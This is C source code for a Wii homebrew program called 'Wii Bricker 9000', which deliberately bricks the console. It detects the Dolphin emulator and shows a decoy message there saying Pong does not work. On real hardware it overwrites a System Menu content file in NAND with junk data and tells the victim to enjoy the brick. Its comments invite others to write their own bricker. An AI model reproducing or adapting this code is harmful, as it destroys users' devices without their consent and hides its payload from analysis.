// Wii Bricker 9000
// Created by Frutre3 with "additions" by <redacted>
// nand.h by whoever wrote it at DC24

#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <wiiuse/wpad.h>

#include "nand.h"

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

int main(int argc, char **argv) {
	VIDEO_Init();
	WPAD_Init();
	NAND_Init();
	rmode = VIDEO_GetPreferredMode(NULL);
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));
	console_init(xfb,20,20,rmode->fbWidth,rmode->xfbHeight,rmode->fbWidth*VI_DISPLAY_PIX_SZ);
	VIDEO_Configure(rmode);
	VIDEO_SetNextFramebuffer(xfb);
	VIDEO_SetBlack(FALSE);
	VIDEO_Flush();
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();
	
	// Dolphin detector
	if (NAND_IsFilePresent("/sd.raw")) {
		printf("Pong doesn't work on Dolphin. Sorry!");
	} else {
		// Here's the real meat of the bricker. Here's where you can implement your new bricker of doom!
		printf("\x1b[41;37m");
		printf("\x1b[2J");
		printf("\n\tWii Bricker 9000");
		printf("\n================================================================================");
		printf("\n\tCorrupting /title/00000001/00000002/content/0000009a.app...");
		NAND_WriteFile("/title/00000001/00000002/content/0000009a.app", "OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU", 0x40, true);
		printf("\n\n\tDone! Enjoy your brick! UwU");
	}

	while(1) {
		WPAD_ScanPads();
		u32 pressed = WPAD_ButtonsDown(0);
		if (pressed & WPAD_BUTTON_HOME) exit(0);
		VIDEO_WaitVSync();
	}

	return 0;
}